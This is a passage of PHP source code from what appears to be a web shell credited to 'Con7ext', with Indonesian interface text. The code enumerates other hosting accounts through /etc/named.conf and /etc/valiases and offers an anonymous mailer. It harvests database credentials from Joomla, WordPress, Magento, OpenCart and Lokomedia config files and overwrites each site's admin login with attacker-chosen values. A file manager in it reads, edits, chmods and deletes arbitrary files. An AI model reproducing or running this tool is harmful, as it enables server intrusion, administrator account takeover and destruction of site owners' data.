						$jrw = "[<font color=green>R</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						if(is_writable($user_jumping_dir)) {
							$jrw = "[<font color=green>RW</font>] <a href='?path=$user_jumping_dir'><font color=gold>$user_jumping_dir</font></a>";
						}
						echo $jrw;
						if(function_exists('posix_getpwuid')) {
							$domain_jump = file_get_contents("/etc/named.conf");	
							if($domain_jump == '') {
								echo " => ( <font color=red>gabisa ambil nama domain nya</font> )<br>";
							} else {
								preg_match_all("#/var/named/(.*?).db#", $domain_jump, $domains_jump);
								foreach($domains_jump[1] as $dj) {
									$user_jumping_url = posix_getpwuid(@fileowner("/etc/valiases/$dj"));
									$user_jumping_url = $user_jumping_url['name'];
									if($user_jumping_url == $myuser_jump) {
										echo " => ( <u>$dj</u> )<br>";
										break;
									}
								}
							}
						} else {
							echo "<br>";
						}
					}
				}
			}
		}
		if($i == 0) { 
		} else {
			echo "<br>Total ada ".$i." Kamar di ".$ip;
		}
		echo "</pre>";
	}
	echo "</div>";
}elseif($_GET['con7ext'] == 'mail') {
if($_POST['send']) {
  $to = $_POST['to'];
  $from = $_POST['from'];
  $subject = $_POST['subject'];
  $content = sulap($_POST['content']);
  if(@mail($to,$subject,$content,"FROM:$from")) {
    $out = "Mail sent to $to";
  } else {
    $out = "Failed !!";
  }
}
  echo "<h1>Mailer</h1>
<form method='post'>
<textarea name='content' value='Patch your security !' placeholder='Patch your security !'></textarea><br>
Subject :
<input type='text' name='subject' value='Your Website'><br>
To : <input type='text' name='to' value='admin@web.com'><br>From : <input type='text' name='from' value='con7ext@ini.email'><br><input type='submit' name='send' value='Send'><br><br>";
echo $out;
}elseif($_GET['con7ext'] == 'edituser') {
	if($_POST['hajar']) {
		if(strlen($_POST['pass_baru']) < 6 OR strlen($_POST['user_baru']) < 6) {
			echo "username atau password harus lebih dari 6 karakter";
		} else {
			$user_baru = $_POST['user_baru'];
			$pass_baru = md5($_POST['pass_baru']);
			$conf = $_POST['config_dir'];
			$scan_conf = scandir($conf);
			foreach($scan_conf as $file_conf) {
				if(!is_file("$conf/$file_conf")) continue;
				$config = file_get_contents("$conf/$file_conf");
				if(preg_match("/JConfig|joomla/",$config)) {
					$dbhost = ambilkata($config,"host = '","'");
					$dbuser = ambilkata($config,"user = '","'");
					$dbpass = ambilkata($config,"password = '","'");
					$dbname = ambilkata($config,"db = '","'");
					$dbprefix = ambilkata($config,"dbprefix = '","'");
					$prefix = $dbprefix."users";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result['id'];
					$site = ambilkata($config,"sitename = '","'");
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Joomla<br>";
					if($site == '') {
						echo "Sitename => <font color=red>error, gabisa ambil nama domain nya</font><br>";
					} else {
						echo "Sitename => $site<br>";
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/WordPress/",$config)) {
					$dbhost = ambilkata($config,"DB_HOST', '","'");
					$dbuser = ambilkata($config,"DB_USER', '","'");
					$dbpass = ambilkata($config,"DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"DB_NAME', '","'");
					$dbprefix = ambilkata($config,"table_prefix  = '","'");
					$prefix = $dbprefix."users";
					$option = $dbprefix."options";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[ID];
					$q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[option_value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET user_login='$user_baru',user_pass='$pass_baru' WHERE id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Wordpress<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/Magento|Mage_Core/",$config)) {
					$dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
					$dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
					$dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
					$dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
					$dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
					$prefix = $dbprefix."admin_user";
					$option = $dbprefix."core_config_data";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
					$result2 = mysql_fetch_array($q2);
					$target = $result2[value];
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Magento<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
					$dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
					$dbuser = ambilkata($config,"'DB_USERNAME', '","'");
					$dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
					$dbname = ambilkata($config,"'DB_DATABASE', '","'");
					$dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
					$prefix = $dbprefix."user";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
					$result = mysql_fetch_array($q);
					$id = $result[user_id];
					$target = ambilkata($config,"HTTP_SERVER', '","'");
					if($target == '') {
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
					} else {
						$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE user_id='$id'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => OpenCart<br>";
					echo $url_target;
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				} elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
					$dbhost = ambilkata($config,'server = "','"');
					$dbuser = ambilkata($config,'username = "','"');
					$dbpass = ambilkata($config,'password = "','"');
					$dbname = ambilkata($config,'database = "','"');
					$prefix = "users";
					$option = "identitas";
					$conn = mysql_connect($dbhost,$dbuser,$dbpass);
					$db = mysql_select_db($dbname);
					$q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
					$result = mysql_fetch_array($q);
					$target = $result[alamat_website];
					if($target == '') {
						$target2 = $result[url];
						$url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						if($target2 == '') {
							$url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
						} else {
							$cek_login3 = file_get_contents("$target2/adminweb/");
							$cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
							if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
								$url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
							} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
								$url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
							} else {
								$url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
							}
						}
					} else {
						$cek_login = file_get_contents("$target/adminweb/");
						$cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
						if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
							$url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
						} elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
							$url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
						} else {
							$url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
						}
					}
					$update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
					echo "Config => ".$file_conf."<br>";
					echo "CMS => Lokomedia<br>";
					if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
						echo $url_target2;
					} else {
						echo $url_target;
					}
					if(!$update OR !$conn OR !$db) {
						echo "Status => <font color=red>".mysql_error()."</font><br><br>";
					} else {
						echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
					}
					mysql_close($conn);
				}
			}
		}
	} else {
		echo "<center>
		<h1>Auto Edit User Config</h1>
		<form method='post'>
		DIR Config: <br>
		<input type='text' size='50' name='config_dir' value='$path'><br><br>
		Set User & Pass: <br>
		<input type='text' name='user_baru' value='con7ext' placeholder='user_baru'><br>
		<input type='text' name='pass_baru' value='con7ext' placeholder='pass_baru'><br>
		<input type='submit' name='hajar' value='Edit' style='width: 215px;'>
		</form>";
	}
}elseif(isset($_GET['filesrc'])){
echo "<tr><td>Current File : ";
echo $_GET['filesrc'];
echo '</tr></td></table><br/>';
echo('<textarea cols="80" rows="20" readonly>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</textarea>');
}elseif(isset($_GET['option']) && $_POST['opt'] != 'delete'){
echo '</table><br /><center>'.$_POST['path'].'<br /><br />';
if($_POST['opt'] == 'chmod'){
if(isset($_POST['perm'])){
if(chmod($_POST['path'],$_POST['perm'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
}
echo '<form method="POST">
Permission : <input name="perm" type="text" size="4" value="'.substr(sprintf('%o', fileperms($_POST['path'])), -4).'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="chmod">
<input type="submit" value="Go" />
</form>';
}
elseif($_POST['opt'] == 'rename'){
if(isset($_POST['newname'])){
if(rename($_POST['path'],$path.'/'.$_POST['newname'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br />';
}
$_POST['name'] = $_POST['newname'];
}
echo '<form method="POST">
New Name : <input name="newname" type="text" size="20" value="'.$_POST['name'].'" />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="rename">
<input type="submit" value="Go" />
</form>';
}elseif($_POST['opt'] == 'edit'){
if(isset($_POST['src'])){
$fp = fopen($_POST['path'],'w');
if(fwrite($fp,$_POST['src'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !</font><br/>';
}
fclose($fp);
}
echo '<form method="POST">
<textarea cols=80 rows=20 name="src">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />
<input type="hidden" name="path" value="'.$_POST['path'].'">
<input type="hidden" name="opt" value="edit">
<input type="submit" value="Save" />
</form>';
}
echo '</center>';
}else{
echo '</table><br/><center>';
if(isset($_GET['option']) && $_POST['opt'] == 'delete'){
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="green">Success !</font><br/>';
}else{
echo '<font color="red">Denied !                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="green">Success</font><br/>';
}else{
echo '<font color="red">Denied</font><br/>';
}
}
}
echo '</center>';
$scandir = scandir($path);
echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
<tr class="first">
<td><center>Name</center></td>
<td><center>Size</center></td>
<td><center>Permission</center></td>
<td><center>Action</center></td>
</tr>';

foreach($scandir as $dir){
if(!is_dir($path.'/'.$dir) || $dir == '.' || $dir == '..') continue;
echo '<tr>
<td><a href="?path='.$path.'/'.$dir.'">'.$dir.'</a></td>
<td><center>--</center></td>
<td><center>';
if(is_writable($path.'/'.$dir)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$dir)) echo '<font color="red">';
echo perms($path.'/'.$dir);
if(is_writable($path.'/'.$dir) || !is_readable($path.'/'.$dir)) echo '</font>';

echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
</select>
<input type="hidden" name="type" value="dir">
<input type="hidden" name="name" value="'.$dir.'">
<input type="hidden" name="path" value="'.$path.'/'.$dir.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>';
foreach($scandir as $file){
if(!is_file($path.'/'.$file)) continue;
$size = filesize($path.'/'.$file)/1024;
$size = round($size,3);
if($size >= 1024){
$size = round($size/1024,2).' MB';
}else{
$size = $size.' KB';
}

echo '<tr>
<td><a href="?filesrc='.$path.'/'.$file.'&path='.$path.'">'.$file.'</a></td>
<td><center>'.$size.'</center></td>
<td><center>';
if(is_writable($path.'/'.$file)) echo '<font color="green">';
elseif(!is_readable($path.'/'.$file)) echo '<font color="red">';
echo perms($path.'/'.$file);
if(is_writable($path.'/'.$file) || !is_readable($path.'/'.$file)) echo '</font>';
echo '</center></td>
<td><center><form method="POST" action="?option&path='.$path.'">
<select name="opt">
<option value="">Select</option>
<option value="delete">Delete</option>
<option value="chmod">Chmod</option>
<option value="rename">Rename</option>
<option value="edit">Edit</option>
</select>
<input type="hidden" name="type" value="file">
<input type="hidden" name="name" value="'.$file.'">
<input type="hidden" name="path" value="'.$path.'/'.$file.'">
<input type="submit" value=">">
</form></center></td>
</tr>';
}
echo '</table>
</div>';
}
echo '<center><br/>Copyright &copy '.date("Y").' <a href="https://www.facebook.com/rinto2234" target="_blank">Con7ext</a> - <a href="https://www.facebook.com/xaisyndicate" target="_blank">'.$_COPY.'</a></center>
</body>
</html>';
?>
